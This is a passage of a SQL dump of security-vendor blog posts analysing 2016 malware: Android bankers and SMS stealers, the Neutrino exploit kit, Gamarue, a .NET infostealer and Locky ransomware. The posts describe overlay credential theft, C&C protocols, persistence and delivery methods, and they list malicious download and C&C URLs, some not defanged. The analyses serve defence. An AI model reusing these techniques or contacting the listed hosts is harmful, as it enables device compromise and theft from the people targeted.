etc) made by the malicious app.  The functionality was embedded in the class named \"MeSystem.\" This class was responsible for extracting numbers from C&C server\'s response and to make calls to those numbers. In the screenshot below, \'str\' is the string that was received from C&C.         	  		  			  			  			  		  		  			  			Call functionality  			  		  	           Call interception:    The malicious app also implemented call interception functionality. Currently, we found that it was only collecting the information about incoming call phone numbers and the duration of the call. It was not recording calls.  Screenshot below was taken when the device received a call and malware sent over the details to C&C server.         	  		  			  			  			  		  		  			  			Call details in HTTP request  			  		  	           Overlay Functionality:    In addition to the Sberbank app, this malware was also designed to target these three apps:  -Whatsapp.  -Google Play Store app.  -VTB 24 Banking app.    The list of targeted apps was sent by the remote C&C server and is stored locally by the app as shown below:         	  		  			  			  			  		  		  			  			URLs for fake login screens  			  		  	           \"name\" field justifies the package names of the app, such that whenever any app from the above mentioned list is opened, the malware detects it and overlays fake login screen according to the URL mentioned for respective package name.    The fake login pages fetched from those URLs have the same representation as the original ones. Once the user enters their credentials, they are sent to C&C server and the same functionality of displaying technical error is implemented.    Following screenshots show fake login page for VTB-24 online banking app and credentials being sent to C&C :           	  		  			  			  			  		  		  			  			Fake login for VT bank  			  		  	           It\'s a new trend for malware developers to target the victim with help of security features of the app. In the previous blog, we saw how attackers leveraged fake security app theme. In case of WhatsApp, malware developers have attempted to lure victims using a fake message for newly implemented encryption functionality.    When the original WhatsApp app was opened, the malware displays an overlay screen fetched from the respective URL supplied by C&C server. Initially it displayed a message stating that WhatsApp needs authentication and payment information for the newly implemented Encryption functionality.    As soon as victim proceeds, the malware asks for the required details and relays it to the C&C server.    Following screenshot shows this functionality:           	  		  			  			  			  		  		  			  			Fake WhatsApp   			  		  	           Persistence:    Apart from this, the malware has a very clever approach to remain persistent. It registers a broadcast receiver that triggers whenever the victim tries to remove administrator rights of the malware app, locking the android device for a few seconds. As a result, it is not possible to uninstall this malicious app by revoking admin rights. Screenshot below shows this functionality in action:         	  		  			  			  			  		  		  			  			Lock down functionality  			  		  	           The only option left with the victim is to reset the device to factory settings. This again will lead to more data loss for the victim.    Conclusion:    Targeting bank customers using fake banking apps is the easiest way and the most successful vector for attackers. This malware combines multiple malicious functionalities into a single app and takes full advantage of a successful infection. The attacker can control the list of legitimate apps to be targeted via C&C commands, causing the malware app to display an overlay screen supressing the legitimate app and steal sensitive user information.    The certificate of this malicious app was recently updated and the C&C server domain was also recently registered. Zscaler\'s ThreatLabZ will continue to monitor future activities from this malware family and ensure adequate security coverage.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/android-banker-malware-goes-social');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (102, 'Neutrino Malvertising campaign drops Gamarue', 'Derek Gooley', 'May 25, 2016', 'Introduction\r\n\r\nNeutrino Exploit Kit (EK) has not seen as much activity this year as more popular kits like Angler and RIG. But over the last month we have seen an increase in activity from Neutrino, with multiple campaigns using both compromised sites and advertising services. \r\n\r\n\r\n\r\nFigure 1: Neutrino hits over the last 30 days\r\n\r\nAlthough the majority of Neutrino activity in 2016 has been through compromised, otherwise legitimate sites, several new Neutrino malvertising campaigns have emerged. Like several campaigns observed in late 2015, the end payload from the exploit kit from these recent campaigns was Gamarue/Andromeda.  Multiple advertising networks were involved in serving the malicious pages, which served other advertising content as well as a Neutrino landing page.\r\n\r\nMalvertising campaign\r\n\r\nThe content served by the advertising networks consisted of two iframe injections. One served the advertising content, which typically pulled from casino-related game sites. The other requested PHP page from the same host, which would serve yet another iframe that pointed to one of several Neutrino landing page domains hosted on the same IP. After multiple requests to the intermediary page, the host would stop serving the iframe redirect and instead serve a blank page, making enumerating the associated landing pages challenging.\r\n\r\n\r\n\r\nFigure 2: Neutrino EK infection session\r\n\r\n\r\n\r\nFigure 3: iframe redirects from malicious site\r\n\r\nNeutrino EK landing pages are fairly unsophisticated, usually just an embedded Flash object as compared to Angler’s landing pages containing highly obfuscated JavaScript. The landing page observed in this campaign is identical to most other Neutrino landing pages we have seen recently; nothing more than an embedded Flash exploit, in line with common Neutrino resource naming convention. \r\n\r\n\r\n\r\nFigure 4: Neutrino EK Landing page\r\n\r\nThe landing page serves a malicious SWF in standard EK form. This exploits Flash Player and downloads, decrypts, and executes a packed Gamarue payload.\r\n\r\n\r\n\r\nFigure 5: Flash exploit payload\r\n\r\n\r\n\r\nFigure 6: Encrypted Malware payload\r\n\r\nGamarue\r\n\r\nGamarue/Andromeda is a modular trojan and a well-documented malware family that has seen many changes over the last several years. It is frequently used to download other second-stage payloads or toolkits, as well as extending its own functionality with modules downloaded after infection.\r\n\r\nThe sample attempted to contact a command and control server hosted on a domain with a similar naming scheme to the original malicious site. Other samples seen in the campaign contacted similar domains, hosted on different IPs. At one point, the botnet C2 was hosted on the same IP as the malicious domain. We observed Gamarue downloading additional modules from the callback domain.\r\n\r\nGamarue uses the machine volume serial number as part of its botnet registration. If multiple attempts were made to run a sample in a sandbox with the same volume serial number, the registration would fail and no further modules would be downloaded.\r\nThe Gamarue base uses several anti-analysis methods to avoid being run in a sandbox. However, the anti-analysis functionality can be bypassed by creating a registry key under “HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies” named “is_not_vm” with the value as the volume serial number as a 32-bit hexadecimal number.\r\n\r\n\r\n\r\nFigure 7: Gamarue callback traffic\r\n\r\n\r\n\r\nFigure 8: Gamarue modules\r\n\r\nGamarue/Andromeda is analyzed in depth at https://blog.avast.com/andromeda-under-the-microscope\r\n\r\nConclusion\r\n\r\nThis exploit chain is a typical example of recent malvertising activity using Neutrino EK. Using advertising services to deliver exploit kits allows the attacker to rapidly set up new malicious domains without having to compromise existing legitimate hosts. Gamarue is still a common payload for Neutrino and other exploit kits, as it is easily customizable to serve as a downloader for a second-stage infection or extended with other modules. To help avoid infections such as these, users should always block untrusted third-party scripts and resources. \r\n\r\nZscaler’s ThreatLabZ has confirmed coverage for the Neutrino EK redirect & landing page scripts and Gamarue payloads, ensuring protection for organizations using Zscaler’s Internet security platform.\r\n\r\nIOCs\r\n\r\nAdvertising hosts:\r\n\r\nwww.myadserver-hub.com\r\n\r\nwww.liveadexchanger.com\r\n\r\nwww.adnetworkperformance.com\r\n\r\nwww.brightadnetwork.com\r\n\r\nads.deltatv.site\r\n\r\nspeednetwork1.adk2x.com\r\n\r\nMalicious domain: kkkj[.]ru (195.211.153.40, 31.184.233.109)\r\n\r\nLanding page domains: \r\n\r\ngojjiraffe.top (108.61.221.86)\r\n\r\nfetsnake.top (94.177.249.150)\r\n\r\nkixmandrill.top (94.177.249.150)\r\n\r\nwaterof.top (94.177.249.150)\r\n\r\nhouruq.top (94.177.249.150)\r\n\r\nCallback domains:\r\n\r\nzggg[.]ru (95.213.192.70)\r\n\r\nzvvv[.]ru (95.213.192.70)\r\n\r\nznnn[.]ru (195.211.153.40, 31.184.233.109)\r\n\r\nSWF exploit: D834A9891C7438B13F4A0D34ED71C84A \r\n\r\nGamarue: A5EE3924786A8425A6C5BCFD8D6310FC', 'Compromise;Malware', 'https://www.zscaler.com/blogs/research/neutrino-malvertising-campaign-drops-gamarue');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (103, 'New Infostealer Trojan uses Fiddler Proxy & Json.NET', 'Deepen Desai', 'May 05, 2016', 'Introduction\r\nZscaler ThreatLabZ came across a new Infostealer Trojan written in .NET that utilizes popular tools like Fiddler & Json.NET for its operation. In April, the new Infostealer family of Spanish origin was first noted targeting users in the U.S. and Mexico.\r\n\r\nThe malware authors are currently targeting users of Mexico\'s second largest bank, Banamex, but it is capable of updating the configuration file to include more financial institutions.\r\n\r\nDelivery Mechanism & Installation\r\nThe infection cycle starts with an installer payload that uses double extension \'curp.pdf.exe\' in a relatively poor attempt to pose as a PDF document to the end user. The malware payload does not have the PDF file icon embedded in it, so the user will see the document file with a generic application icon as seen below:\r\n\r\n                                                 \r\n\r\n                      Infostealer installer using double file extension\r\n\r\nSample URLs that we have seen serving installer payloads in last two weeks:\r\n\r\ncigm[.]co/js/slick/curp.pdf.exe\r\nsaysa[.]com.co/js/rfc.pdf.exe\r\nsaysa[.]com.co/js/curp.pdf.exe\r\nbestdentalimplants[.]co.in/js/curp.pdf.exe\r\ndenticenter[.]com.co/js/slick/curp.pdf.exe\r\n\r\n \r\n\r\nOnce executed, the installer will attempt to download the following three components on the victim\'s machine:\r\n\r\n\r\n	syswow.exe - This is the main Infostealer payload that steals the banking credentials\r\n\r\n\r\n\r\n	FiddlerCore3dot5.dll - Fiddler Proxy Engine for .NET applications. This is a legitimate .NET Class library file that the malware authors are using in the main Infostealer functionality \r\n\r\n\r\n\r\n	Newtonsoft.Json.dll - Open source JSON framework for .NET applications. This is a legitimate .NET Class library file that the malware authors are using for parsing Command & Control (C&C) server response data and converting it into XML format\r\n\r\n\r\nThe above files are downloaded in the windows system directory as seen in the code below:\r\n\r\n\r\n\r\n                                             Infostealer installer downloading components\r\n\r\nThe installer will then execute the main Infostealer payload and terminates itself.\r\n\r\nInfostealer Payload analysis\r\n\r\nThe Infostealer payload first checks for the presence of the FiddlerCore3dot5.dll and Newtonsoft.Json.dll on the victim\'s machine. If the DLL files are not found then the malware will attempt to download these files from a new location that is hard-coded in the payload. Once the DLLs are in place, the malware will check for the victim\'s operating system version as seen below:\r\n\r\n\r\n\r\n                                             Infostealer checking operating system version\r\n\r\nFor Windows XP (32-bit & 64-bit) and Windows Server 2003, the malware will create an autostart registry key entry to ensure persistence upon system reboot. Then, the malware downloads a configuration file and starts the Fiddler proxy engine.\r\n\r\nFor other versions of Windows, the malware will not create an autostart registry key. However, in order for the Fiddler proxy engine to work properly the malware will install a Fiddler generated root certificate before starting the proxy engine.\r\n\r\nC&C configuration file\r\n\r\nUpon successful installation, the Infostealer Trojan will collect information such as “MachineName”, “UserName”, “systeminfo” and “hostip” from the infected system and sends it to the remote C&C server in Base64 encoded format as seen below:\r\n\r\n\r\n\r\n                                    Infostealer sending machine information\r\n\r\nThe C&C server will respond back with a configuration file that contains a list of URLs pointing to alternate C&C locations as well as other instructions. The malware uses Json.NET library to parse the server response and save it in the XML format with file name registro.xml. Here is a sample configuration file that we saw during our analysis:\r\n\r\n\r\n\r\n                                 Infostealer XML configuration file\r\n\r\nThe configuration file also contains a list of Domain to IP tuples that are primarily used by the Infostealer Trojan to hijack user requests to those domains and redirecting them to a malicious server hosting fake phishing site for the targeted domain.\r\n\r\nThe malware initializes a timer component with an interval of 10 minutes that will trigger a RefreshInfo function call. This will result in a download of a new configuration file from the next URL in the list every 10 minutes.\r\n\r\nFiddler to intercept HTTP and HTTPS traffic\r\n\r\nIt is interesting to note that the malware leverages Fiddler proxy engine to intercept HTTP/HTTPS connections and redirecting the users to the attacker-controlled server hosting fake site.\r\n\r\nThe malware achieves this by adding x-overrideHost flag containing attacker\'s Server IP address, if the domain name is on the target list in the C&C configuration file. This will cause Fiddler proxy engine to resolve the domain to the supplied IP address sending the victim user to a fake website.\r\n\r\nScreenshot of fake Banamex page from an infected system:\r\n\r\n\r\n\r\n                       Fake Banamex site hosted on the attacker-controlled server\r\n\r\nConclusion\r\nWe regularly see multiple .NET based malware payloads but this particular Infostealer Trojan caught our attention because of the use of popular application libraries like Fiddler & Json.NET in its operation.\r\n\r\nMexico\'s second largest bank - Banamex, appears to be the main target of this Infostealer Trojan for credential theft and financial fraud. However, the authors can easily add more targets given that they are actively updating the list every 10 minutes. Zscaler’s ThreatLabZ has confirmed coverage for the initial downloader and the Infostealer payloads, ensuring protection for organizations using Zscaler’s Internet security platform.\r\n\r\nIOCs\r\nInfostealer installer payload MD5sum:\r\n\r\n\r\n	123f4c1d2d3d691c2427aca42289fe85\r\n	070ab6aa63e658ff8a56ea05426a71b4\r\n	ac6027d316070dc6d2fd3b273162f2ee\r\n	98bbc1917613c4a73b1fe35e3ba9a8d9\r\n	070ab6aa63e658ff8a56ea05426a71b4\r\n	06f3da0adf8a18679d51c6adaa100bd4\r\n	123f4c1d2d3d691c2427aca42289fe85\r\n	8c9896440fb0c8f2d36aff0382c9c2e4\r\n\r\n\r\nAuthors: Deepen Desai, Avinash Kumar', 'Malware', 'https://www.zscaler.com/blogs/research/new-infostealer-trojan-uses-fiddler-proxy-jsonnet');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (104, 'Android infostealer posing as a fake Google Chrome update', 'Viral Gandhi', 'April 28, 2016', 'Our research team has recently seen a large amount of activity in our cloud related to an Android infostealer disguised as a Google Chrome update. This malware is capable of harvesting call logs, SMS data, browser history and banking information and is sending it to a remote command and control (C&C) server. This malware is also capable of checking the installed antivirus applications and terminating them to evade detection.\r\n\r\nFollowing is a sample of URLs we have seen where the malware is being downloaded.\r\n\r\n\r\n	http[:]//ldatjgf[.]goog-upps.pw/ygceblqxivuogsjrsvpie555/\r\n	http[:]//iaohzcd[.]goog-upps.pw/wzbpqujtpfdwzokzcjhga555/\r\n	http[:]//uwiaoqx[.]marshmallovw.com/\r\n	http[:]//google-market2016[.]com/\r\n	http[:]//ysknauo[.]android-update17[.]pw/\r\n	http[:]//ysknauo[.]android-update16[.]pw/\r\n	http[:]//android-update15[.]pw/\r\n	http[:]//zknmvga[.]android-update15[.]pw/\r\n	http[:]//ixzgoue[.]android-update15[.]pw/\r\n	http[:]//zknmvga[.]android-update15[.]pw/\r\n	http[:]//gpxkumv.web-app.tech/xilkghjxmwvnyjsealdfy666/\r\n\r\n\r\nYou can observe that the malware author is using domain squatting to mix up the host name similar to Google updates. These URLs are observed to be very short lived. and are regularly replaced with newer ones to serve the malware and effectively evade URL based filtering.\r\n\r\nThe file that gets downloaded from these URLs is called “Update_chrome.apk”. Once the user installs the APK, it prompts for the administrative access. Following is the code routine and a screenshot showing this malware getting installed as an app, having administrative access.\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n			\r\n			\r\n		\r\n		\r\n			\r\n			Device admin access.\r\n			\r\n		\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n			\r\n			\r\n		\r\n		\r\n			\r\n			Code routine - admin access.\r\n			\r\n		\r\n	\r\n\r\n\r\nThis malware payload is capable of checking for installed security applications and terminating them. We saw hard coded checks for antivirus applications like Kaspersky, ESET, Avast and Dr. Web as seen below.\r\n\r\n\r\n	\r\n		\r\n			\r\n			\r\n			\r\n		\r\n		\r\n			\r\n			Antivirus check.\r\n			\r\n		\r\n	\r\n\r\n\r\nOnce installed, the malware registers the device with the C&C server. Observe following code and network capture showing the registration of infected device.\r\n\r\n\r\n	\r\n		\r\n			\r\n			\r\n			\r\n		\r\n		\r\n			\r\n			Code routine - Infected device registration to C&C.\r\n			\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n			\r\n			\r\n		\r\n		\r\n			\r\n			Network capture - Infected device registration to C&C.\r\n			\r\n		\r\n	\r\n\r\n\r\nOnce registration is completed, the malware monitors SMS and call operations done on the infected device. In the following image, you can see the malware harvesting call logs and sending it to C&C server. It watches all the incoming, outgoing and missed calls.\r\n\r\n\r\n	\r\n		\r\n			\r\n			\r\n			\r\n		\r\n		\r\n			\r\n			Code routine -  Call log harvesting and sending to C&C server\r\n			\r\n		\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n			\r\n			\r\n		\r\n		\r\n			\r\n			Network capture - Call log harvesting and sending to C&C server\r\n			\r\n		\r\n	\r\n\r\n\r\nThis malware is also capable of ending/hanging up the call in case of unknown caller.\r\n\r\n\r\n	\r\n		\r\n			\r\n			\r\n			\r\n		\r\n		\r\n			\r\n			Code routine -  End call.\r\n			\r\n		\r\n	\r\n\r\n\r\nThe following screen shot shows the malware stealing SMS and sending to the C&C server.\r\n\r\n\r\n	\r\n		\r\n			\r\n			\r\n			\r\n		\r\n		\r\n			\r\n			Code routine - SMS harvesting and sending to C&C server.\r\n			\r\n		\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n			\r\n			\r\n		\r\n		\r\n			\r\n			Network capture -  SMS harvesting and sending to C&C server.\r\n			\r\n		\r\n	\r\n\r\n\r\nThis malware is also presenting a fake payment page for all the major credit cards once the user tries to open the play store. The malware will show the fake payment page only if play store app is installed.\r\n\r\n\r\n	\r\n		\r\n			\r\n			\r\n			\r\n		\r\n		\r\n			\r\n			Play store check.\r\n			\r\n		\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n			\r\n			\r\n		\r\n		\r\n			\r\n			Fake payment screen.\r\n			\r\n		\r\n	\r\n\r\n\r\nOnce the user fills all the information, the malware sends this information to a Russian phone number(+7926XXXX135). Observe following screen shot.\r\n\r\n\r\n	\r\n		\r\n			\r\n			\r\n			\r\n		\r\n		\r\n			\r\n			Code routine - Stolen card data being sent to Russian phone.\r\n			\r\n		\r\n	\r\n\r\n\r\nC&C URL:\r\n\r\n\r\n	http[:]//varra.top/tapas/gtgtr[.]php\r\n\r\n\r\nWe observed that the fake payment screen crashed on multiple research lab devices which could be due to a bug in the version of the malware payload we are analyzing but we are still investigating.\r\n\r\nWe are seeing many new URLs dropping this malware actively in the wild.  Such infection of the victim’s device leads to critical information leakage like credit card details, SMS and call logs - which can further lead to financial banking fraud.\r\n\r\nOnce installed, this Infostealer cannot be removed from the phone as the malware does not allow the user to deactivate it’s administrative access. The only option to remove this malware is a factory reset which leads to further data loss.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/android-infostealer-posing-fake-google-chrome-update');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (105, 'Tax Season Scams', 'Ed Miles', 'April 14, 2016', 'Introduction    Tax Season is once again upon those of us who don’t have a tax shelter company in Panama. This year, the IRS warned of a 400% increase in phishing attempts and tax related e-mail scams. While phishing can be leveraged to steal credentials and other information directly, malware attacks can give a foothold to surveil users and networks, and steal all kinds of confidential information.         A broad search of Tax related files indicates that there are a number of users actively downloading files that are related to filing their yearly income taxes. Scammers are counting on this subset of users to exploit.    In the next section, we will detail some attacks attempting to social engineer and infect the unwary tax-preparer.    Scams    TurboTax Ad/Bundleware    In addition to the e-mail based threats the IRS warned of (which we will detail below), we have found some fake downloads for commonly-used tax software such as TurboTax. These \"Download Manager\" packages rely on search engine poisoning combined with unwary users looking for a way to download tax software, even if it may not be completely legal.         Besides promising TurboTax, one of the fake \"installer\" packages we found also offers to install Norton and a free-to-play MMO called StormFall.        Since StormFall is web-based, the \"installation\" consists of placing a shortcut entry in the start menu that launches Chrome with the address of Stormfall (including the adware author\'s advertising ID, of course).         If the Norton option was selected, an icon for an app called Smart Wrapper appears in the taskbar. Opening this app from the taskbar shows the Smart Download status window, depicting the status of the Norton download.        In the end, this \"installer\" doesn\'t even install the TurboTax software that was the original lure. To add insult to injury, the user is shown two browser tabs, one of which is the official TurboTax purchase and download page.    Generating advertising revenue is the primary purpose of threats like these, however they still create a situation where an unknown actor with unknown intentions has achieved the ability to monitor the system, gather information, and make system changes including installing additional software packages.    Tax Report    Our first e-mail based case comes via a ZIP attachment from a scam e-mail aptly named ‘Tax Report.zip’. At the time of research, this threat was detected by 34/56 AV vendors on VirusTotal. The threat itself is a family of Trojan Droppers known as Bagsu. Its purpose is to download additional malware payloads and gain remote access to the PC to collect sensitive information. This sample appears to be no different as it delivered a payload from the Worm family Gamarue.    Gamarue is a Worm that copies itself to all removable devices and network drives connected to the victim’s system. Once installed, it begins beaconing to remote control servers with information about the user. It can download new malicious modules to the victim after infection or simply perform reconnaissance on the user’s system. At the time of research, this sample was already well covered with a score of 46/56 on VirusTotal.        The sample made other attempts to connect to malicious domains, but these were sinkholed at the time of research:    http://dudebox[.]pl/image.php    http://dyndin[.]ru/image.php    http://headart[.]pl/image.php    http://iprice[.]pl/image.php    http://linebench[.]ru/image.php    Tax \'Challan\'    Our second e-mail sample is part of a spam campaign that has been targeting Indian national taxpayers this year. In this campaign, emails are sent from spoofed Indian government domains, alerting the victim that a sum of money has been deducted from their bank account to cover owed taxes. The email instructs the victim to see the challan (receipt) for the transaction, which is a zip archive either attached to the email or hosted at a malicious domain. The archive, typically named some variant of “Tax Payment Challan.zip”, contains a malicious executable. Symantec reported on this campaign earlier this year. This threat remains active, and ThreatLabZ has seen incidents going back to November of 2015.    The malicious payload is an infostealer trojan that attempts to dump passwords from browsers installed on the victim’s machine. The threat is detected with a ratio of 41/57 on VirusTotal, but is mainly detected under generic threat names. The payload is a Visual Basic binary that installs itself in %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ for persistence. The binary also stores a UPX-packed, custom-compiled cURL binary as a resource.        The trojan extracts the resource and uses cURL to download additional payloads from a malicious domain. These tools are wrappers for various freely-available browser password dump software.        The trojan runs the password dump utilities, collects their output, and sends it via HTTP POST to a separate malicious domain.        Zscaler provides coverage for the trojan payload and its network communication.    The following domains are contacted by the infostealer:    laptopb4you[.]com (password dump utilities)    holytrinitycarehome[.]com (callback)    The initial payload has been observed downloaded from the following domains:    digitalcareer.co[.]in    balajiitilanji[.]com    Ijggpb[.]in    Conclusion    Zscaler protects its customers from these threats with multiple layers, but the best protection in this case is to be mindful and cautious. As the IRS Spokesperson Mark S. Green stated: “The IRS DOES NOT initiate contact with taxpayers by email, text, social media or electronic communications to request personal or financial information.\"    If you receive a suspicious email from the IRS, report it by sending it to phishing@irs.gov.         Authors: Edward Miles, Chris Mannon, Derek Gooley', 'Scam', 'https://www.zscaler.com/blogs/research/tax-season-scams');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (106, 'A look at Locky ransomware', 'Dhanalakshmi', 'March 22, 2016', 'Introduction    The Locky ransomware was first spotted in the wild in February 2016. Locky came into the limelight when it hit the Hollywood Hospital last month causing the hospital to pay Bitcoins worth $17,000 in ransom.  Locky is known to arrive via spam e-mails containing malicious attachments.    Zscaler has blocked over 75 unique & new payloads from this ransomware family, targeting our customers, in the last month as shown below:      	  		  			  		  		  			Locky ransomware unique payloads blocked  		  	      The Locky payload delivery mechanism    The initial wave of Locky ransomware spam involved malicious Microsoft Office documents containing VBA macro to download and execute binary payload on the victim machine. Locky authors have since switched to spamming a Zip archive containing malicious JavaScript to download and execute the Locky payload    A sample malicious document from a Locky spam campaign that contains VBA macro designed to download the Locky payload from a predetermined remote location can be seen below:      	  		  			  		  		  			Malicious Document  		  	      A second delivery mechanism involves a heavily obfuscated JavaScript files in a Zip attachment. These JavaScript payloads are highly obfuscated and leverages UTF-16 encoding to hide the download URL. The authors are also changing the obfuscated payload regularly in order to evade AV detection, a technique commonly used by Exploit Kit (EK) authors to protect the EK landing pages. A sample malicious JavaScript code delivering Locky ransomware can be seen below:      	  		  			  		  		  			Obfuscated JavaScript to deliver Locky  		  	      The JavaScript uses ActiveX objects to download Locky ransomware on victim\'s machine. The decoded JavaScript is shown below:      	  		  			  		  		  			Decoded JavaScript  		  	      Payload Analysis    We have seen a large uptick in the delivery of Locky payloads during the month of March 2016.      	  		  			  		  		  			Uptick in Locky payloads getting blocked  		  	      We looked at one of the newer Locky variant that was seen in the wild recently. The analyzed Locky payload is a 32-bit Microsoft Visual C++ compiled Windows executable packed using custom packer routine.    Upon execution, the malware first checks for the user & system default language preferences of the infected system and terminates itself if the language is Russian. Locky creates a copy of itself as \"%TEMP%/svchost.exe\" and an auto start registry key entry to ensure persistence upon system reboot. In order to mark a successful infection on the system, Locky creates the following registry keys with value name \"pubkey\" and \"paytext\" as seen below:      	  		  			  		  		  			Locky registry key  		  		  			  			\"pubkey\" is used to store the RSA key used for encryption    			\"paytext\" is used to store the payment related information  			  		  	      Upon successful infection, Locky will encrypt the following file types on the victim machine:      	  		  			  		  		  			File types encrypted  		  	      These encrypted files are renamed to unique ID generated for the victim\'s machine followed by unique file ID and a \".locky\" extension. The ransom note is displayed in a bitmap image that is also set as a wallpaper for the infected user\'s desktop as seen below:      	  		  			  		  		  			Ransom note  		  	      As seen in case of other crypto ransomware families, victim\'s files are held as hostage for a ransom. The ransom payment instructions for receiving the private RSA key required to decrypt the user files is readily available through the URLs mentioned in the ransom note.      	  		  			  		  		  			Payment instructions  		  	        Command & Control communication      The Locky payload contains a list of hardcoded Command & Control (C&C) server IP addresses that appear in plain text in the unpacked binary as seen below:      	  		  			  		  		  			Hardcoded C&C IPs  		  	      In addition, Locky ransomware also leverages a custom Domain Generation Algorithm (DGA) for hiding its C&C server location. The DGA algorithm used for generating possible C&C domains in the payload that we analyzed can be seen below:      	  		  			  		  		  			Domain Generation Algorithm  		  	      Locky communicates with the C&C server using custom encryption and the following HTTP request format:    POST  http:// [hardcoded IP  or DGA domain]/main.php      	  		  			  		  		  			Sample encrypted C&C communication  		  	        The initial C&C communication typically consists of three HTTP POST requests.    Request #1: Register the infected system\'s unique ID and request RSA key to be used for encrypting user files. The figure below shows the content of this POST request in plain text:      	  		  			  			  			  		  		  			C&C request #1  		  	      The server responds back with a RSA key that is used by Locky to encrypt all the user\'s files on the victim machine.    Request #2: Request the content of ransom note to be displayed on the infected system asking for payment. Below is the content of this POST request as well as the response from the C&C server in decoded form:      	  		  			  		  		  			C&C request #2 & response  		  	      Request #3: The final request sends the statistics about successfully encrypted files as seen below:      	  		  			  		  		  			C&C request #3  		  	      Conclusion    Locky is the latest addition to Ransomware, one of the most active & lucrative malware strains seen in past three years. This new ransomware family follows the same model of using asymmetric (public key) encryption to lock user documents and demand ransom for the decryption key.  The delivery vector has been primarily spammed e-mail attachments that are responsible for downloading the Locky payload. We also noticed an interesting overlap in the recent campaigns where same URLs were being used to deliver both Dridex & Locky payloads.    Zscaler’s ThreatLabZ has confirmed coverage for the initial downloader and Locky payloads, ensuring protection for organizations using Zscaler’s Internet security platform.    Research by: Deepen Desai, Dhanalakshmi PK', 'Malware;Ransomware', 'https://www.zscaler.com/blogs/research/look-locky-ransomware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (107, 'Adult themed Android SMS Stealer Trojan', 'Shivang Desai', 'March 17, 2016', 'During our continued efforts to protect our customers against the latest mobile threats, we came across another malicious app that used pornography to attract users. Noting that 1 in 5 mobile searches are related to porn, it’s no surprise that hackers continue to create fake porn apps to disguise malware. Our researchers analyzed another similar adult themed malware in November last year.      App Name: 岛国速播  URL: hxxp://bhltzgs[.]com:81/sebo363[.]apk  MD5: f71f8db8994699299b0bcda31d951c41  Package Name: ugo.jkh.efp  VirusTotal Detection: 15/55    Overview:    The application in question is presented as a porn player. When the user clicks on the application icon, he or she will be presented with thumbnails to many porn videos. When the user tries to play one of these videos, the application will download 3 files in the background and a shortcut will be placed on the main page of the device. The application also requests on-demand videos via SMS - costing the user money without them knowing. The 3 dropped files are also depicted as porn players. When the user clicks on videos shown in these applications, they again drop more files to the device - resulting in a never-ending process. Some of these dropped files have icons that look similar to the Internet Explorer and Angry Birds applications for the sole purpose of scamming the user. However, these dropped applications are actually SMS stealers or fake installers.    Details:    When you try to install the application, it asks for the following permissions:       	  		  			  		  		  			Permissions  		  	        Upon launching the application, you will be able to see a list of obscene videos. When you click on any of those videos, instead of playing them the malware drops 3 additional porn applications on the device.      	  		  			  		  		  			Different Levels  		  	      Technical Analysis:    When the user tries to play a video from the application, a JAR file is downloaded from the link hxxp://link[.]kssgx[.]com/cj[.]jar. This URL is stored in the application in the following fashion:      	  		  			  		  		  			cj.jar URL formation  		  	      Subsequently it fetches another URL from the downloaded cj.jar, which is then used to drop multiple malicious apps to the user\'s device. The link for downloading the dropper files are stored in an xml file, the link to which is present in cj.jar      	  		  			  		  		  			URL for XML file  		  	      This xml file contains the URL for downloading the dropper files.      	  		  			  		  		  			XML file contents  		  	      All the downloaded files have been flagged malicious by multiple AV vendors. Here are links to 3 malicious APK files dropped on the device by the main application:        	  	hxxp://sfgg[.]gpdzj[.]com/download/20160302/mmys1069[.]apk   	  	  	hxxp://www0127[.]007wr[.]com/a[.]php?aid=1313 - Qvodplayer1001.apk  	  	  	hxxp://csu[.]hsouying[.]com/IJjyMj - this gets redirected to hxxp://appcdn[.]hsouying[.]com/video/appstore1/destapk/1457085498605/avplay02039[.]apk  	        These files also take the form of porn players, but are actually SMS stealers. When the user tries to launch one of these applications, it again results in dropping of more files into the device, which continues a never-ending chain. Two of the dropped applications have icons similar to Internet Explorer in order to scam the users into using the application.      	  		  			  		  		  			Downloaded Applications  		  	      This application downloads yet another file from the link hxxp://cdn2[.]upay360[.]cn/pack[.]dat. This is a jar file, which shows some really shady behavior. This jar file uses 3 broadcast receivers:      	  	SMSReceiver   	  	  	SendBroadcastReceiver  	  	  	DeliverBroadcastReceiver  	      The application uses the concept of pending intents, which allows another application to use your application\'s permissions to execute a predefined piece of code.    SMSReceiver is triggered whenever an SMS is received. Its functionality is to fetch the details of each new SMS. It checks whether the SMS has been sent from China and if so, will abort the notification so that the user has no knowledge of the new SMS.      	  		  			  		  		  			SMS Receiver  		  	      The application also scams the user with premium on-demand videos, which are requested via SMS without the knowledge of users. This application leverages the commonly known 1npay to scam the victims. The application sends out a POST request, in which the method of payment is specified via SMS.      	  		  			  		  		  			POST request for SMS  		  	      SendBroadcastReceiver listens to the order SMS being sent to the number 106566660020, which is hardcoded in the application. On sending the order message, the user will receive a verify code via SMS. SMSReceiver aborts the broadcast of this message so no notifications are shown for the delivery of the new message to the end user.    DeliverBroadcastReceiver retrieves the verify code from the message and sends it in order to verify the order. This whole process causes the user to lose money.    The application also sends device related information. Below is the POST request sent by the application that was captured during our analysis:        	  		  			  		  		  			Device Details in post request  		  	      Removal:        Since the malware does not ask for Administrator privileges, removing it is not a difficult task.  The victim can traverse to Settings option in the Android device.      	Settings --> Apps  	Find the app in the list and click on it  	Then, click on Uninstall option  	Click Ok      We urge users to not trust any unknown links received via messages or emails. 